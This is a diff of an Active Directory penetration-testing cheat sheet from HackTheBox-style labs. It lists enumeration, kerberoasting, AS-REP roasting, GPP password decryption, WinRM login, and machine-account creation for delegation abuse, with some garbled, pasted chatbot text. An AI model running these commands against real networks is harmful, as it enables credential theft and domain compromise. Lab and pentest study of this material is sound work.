@@ -132,16 +132,21 @@ Comprehensive list of **common ports used in an Active Directory (AD) environmen
 ---
 
 
-
 ## SMB Enum [port 445, 139]
+```
 smbmap -H $ip
 smbclient -L //$IP/
 smbclient -L //$IP/share -c "recurse,ls"
 enum4linux -a $IP
 smbexec
-
+```
+## Resetting SMB password (can log in until password change)
+```
+smbpass -u user -i 
+```
 
 ## RPC ENum [port 135]
+```
 rpcclient -U 'CICADA.htb/' $IP
 rpcclient -U '' -N $IP
   enumdomusers
@@ -151,14 +156,14 @@ rpcclient -U '' -N $IP
   queryuser marko
 rpcdump.py
 rpcmap.py
-
+```
 ## NP USERS 
 impacket-GetNPUsers -dc-ip $IP -request 'htb.local/' -no-pass
 sudo ntpdate $IP
 impacket-GetUserSPNs -request -dc-ip $IP dc.htb/SVC_TGS:$password[cpassword]
 
 ## WinRM [only when we have creds and Webserver Microsoft HTTPAPI]
-evil-winrm -i $IP -u $USERNAME
+evil-winrm -i $IP -u $USERNAME -p 'pass'
 
 
 ## GPP Decryption [cpassword, kerberoasting]
@@ -169,6 +174,7 @@ gpp-decrypt $password
 kerbrute userenum -d megabank.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
 
 # LDAPSEARCH
+```
 # Anonymous LDAP enumeration (without credentials)
 ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=com"
 ldapsearch -H ldap://$IP -x -s base namingcontext
@@ -178,7 +184,10 @@ ldapsearch -H ldap://$IP -x -b"DC=htb,DC=local" "(objectClass=User)" 'sAMAccount
 ldapsearch -x -H ldap://<IP> -D "<user>@<domain>" -w "<password>" -b "dc=<domain>,dc=com"
 ldapsearch -LLL -H ldap://<IP> -D "<user>@<domain>" -w "<password>" -b "dc=<domain>,dc=com" "(objectClass=*)" | tee ldap_results.txt
 
+```
+
 # Crackmapexec (CME)
+```
 # Basic enumeration without credentials
 crackmapexec smb <IP> --shares
 crackmapexec smb <IP> --users
@@ -187,6 +196,7 @@ crackmapexec smb <IP> --users
 crackmapexec smb <IP> -u "<username>" -p "<password>" --shares
 crackmapexec smb <IP> -u "<username>" -p "<password>" --groups
 crackmapexec ldap <IP> -u "<username>" -p "<password>" --kdc-host <DC_IP> --asreproast
+```
 
 # PowerShell
 # PowerView enumeration (Import PowerView.ps1 first)
@@ -215,6 +225,7 @@ Get-DomainGroupMember -Identity "<group-name>" | Select MemberName
 Invoke-BloodHound -CollectionMethod All -Verbose
 
 # NetExec (NXC)
+```
 # Anonymous enumeration
 nxc.exe /net:<target_ip> /shares
 nxc.exe /net:<target_ip> /sessions
@@ -222,10 +233,11 @@ nxc.exe /net:<target_ip> /sessions
 # With credentials
 nxc.exe /net:<target_ip> /user:<domain>\<username> /pass:<password> /shares
 nxc.exe /net:<target_ip> /user:<domain>\<username> /pass:<password> /sessions
-Here is the response in a code preview pane format for easy copying:
+Here is the response in a code preview pane format for easy copying:plaintext
+```
+# MSSQL
 
-```plaintext
-MSSQL
+```
 
 - nxc mssql /discover
 - nxc mssql /net:<target_ip> /user:<domain>\<username> /pass:<password> /test
@@ -286,6 +298,7 @@ WMI
 ```
 
 # Privilege Escalations
+```
 ## Using PowerView.ps1 to normal use of powershell
 - uploading via upload, curl, Invoke-WebReQuest
 - . ./PowerView.ps1
@@ -297,13 +310,14 @@ Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 - verify if machine was added
 Get-ADComputer -identity FAKE-COMP01
-
+```
 
 # Python BloodHound Enumeration
+```
 bloodhound-python -d pirate.htb -u pentest -p 'p3nt3st2025!&' -ns 10.129.244.95 --dns-tcp --dns-timeout 30 -c All
 sudo neo4j console
 bloodhound
-
+```
 
 
 
